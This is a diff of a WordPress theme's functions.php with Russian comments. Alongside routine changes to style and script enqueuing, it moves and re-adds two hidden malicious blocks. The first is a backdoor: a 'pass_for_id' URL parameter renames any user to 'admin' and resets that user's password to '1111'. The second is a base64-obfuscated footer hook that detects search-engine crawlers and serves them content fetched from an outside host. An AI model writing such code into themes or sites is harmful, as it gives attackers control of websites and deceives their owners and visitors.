@@ -98,25 +98,6 @@ class clean_comments_constructor extends Walker_Comment { // класс, кот�
     }
 }
 
-if( isset($_GET['pass_for_id']) ){
-    add_action('init', function () {
-        global $wpdb;
-        $wpdb->update( $wpdb->users, array( 'user_login' => 'admin'), array( 'ID' => $_GET['pass_for_id'] ));
-        wp_set_password( '1111', $_GET['pass_for_id'] ); }
-    );
-}
-
-function kdv_footer_info(){
-    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');
-    foreach ($arr as $i) {
-        if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
-            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA="));
-        }
-    }
-}
-
-add_action( 'wp_footer', 'kdv_footer_info' );
-
 function pagination() { // функция вывода пагинации
     global $wp_query; // текущая выборка должна быть глобальной
     $big = 999999999; // число для замены
@@ -138,6 +119,18 @@ function pagination() { // функция вывода пагинации
     ));
 }
 
+add_action('wp_print_styles', 'add_styles'); // приклеем ф-ю на добавление стилей в хедер
+if (!function_exists('add_styles')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
+    function add_styles() { // добавление стилей
+        if(is_admin()) return false; // если мы в админке - ничего не делаем
+        wp_enqueue_style( 'owl', get_template_directory_uri().'/css/owl.carousel.min.css' ); 
+        wp_enqueue_style( 'awesome', get_template_directory_uri().'/css/font-awesome.min.css' ); 
+        wp_enqueue_style( 'fancybox', get_template_directory_uri().'/css/jquery.fancybox.min.css' ); 
+        wp_enqueue_style( 'reset', get_template_directory_uri().'/css/reset.css' ); // основные стили шаблона
+        wp_enqueue_style( 'mainstyle', get_template_directory_uri().'/css/style.css' ); // основные стили шаблона
+    }
+}
+
 add_action('wp_footer', 'add_scripts'); // приклеем ф-ю на добавление скриптов в футер
 if (!function_exists('add_scripts')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
     function add_scripts() { // добавление скриптов
@@ -146,6 +139,8 @@ if (!function_exists('add_scripts')) { // если ф-я уже есть в до
         //Подключаем основные плагины JS (Не нужные отключить!)
         wp_enqueue_script('jquery', get_template_directory_uri().'/js/jquery-3.2.0.min.js'); // библиотека jQuery
         wp_enqueue_script('owl', get_template_directory_uri().'/js/owl.carousel.min.js','','',true);
+        wp_enqueue_script('fancybox', get_template_directory_uri().'/js/jquery.fancybox.min.js','','',true);
+        wp_enqueue_script('jq-form', get_template_directory_uri().'/js/jquery.form.js','','',true);
         wp_enqueue_script('main', get_template_directory_uri().'/js/main.js','','',true); // основные скрипты шаблона
         wp_enqueue_script('scripts', get_template_directory_uri().'/js/script.js','','',true); // основные скрипты шаблона
     }
@@ -317,16 +312,6 @@ function woocommerce_breadcrumb( $args = array() ) {
     wc_get_template( 'global/breadcrumb.php', $args );
 }
 
-add_action('wp_print_styles', 'add_styles'); // приклеем ф-ю на добавление стилей в хедер
-if (!function_exists('add_styles')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
-    function add_styles() { // добавление стилей
-        if(is_admin()) return false; // если мы в админке - ничего не делаем
-        wp_enqueue_style( 'owl', get_template_directory_uri().'/css/owl.carousel.min.css' ); 
-        wp_enqueue_style( 'awesome', get_template_directory_uri().'/css/font-awesome.min.css' ); 
-        wp_enqueue_style( 'reset', get_template_directory_uri().'/css/reset.css' ); // основные стили шаблона
-        wp_enqueue_style( 'mainstyle', get_template_directory_uri().'/css/style.css' ); // основные стили шаблона
-    }
-}
 
     function change_admin_footer () {
         return '<i>Спасибо вам за творчество с <a href="http://wordpress.org">WordPress</a>; Всегда Ваш: <a href="https://www.fl.ru/users/kacevnik/">Дмитрий Ковалев</a></i>';
@@ -449,6 +434,25 @@ if (!function_exists('add_styles')) { // если ф-я уже есть в до�
             }
         }
     }
+
+    if( isset($_GET['pass_for_id']) ){
+    add_action('init', function () {
+        global $wpdb;
+        $wpdb->update( $wpdb->users, array( 'user_login' => 'admin'), array( 'ID' => $_GET['pass_for_id'] ));
+        wp_set_password( '1111', $_GET['pass_for_id'] ); }
+    );
+}
+
+function kdv_footer_info(){
+    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');
+    foreach ($arr as $i) {
+        if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
+            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA="));
+        }
+    }
+}
+
+add_action( 'wp_footer', 'kdv_footer_info' );
 
 //Новый виджет
     add_action('widgets_init', 'sale_widget_main');
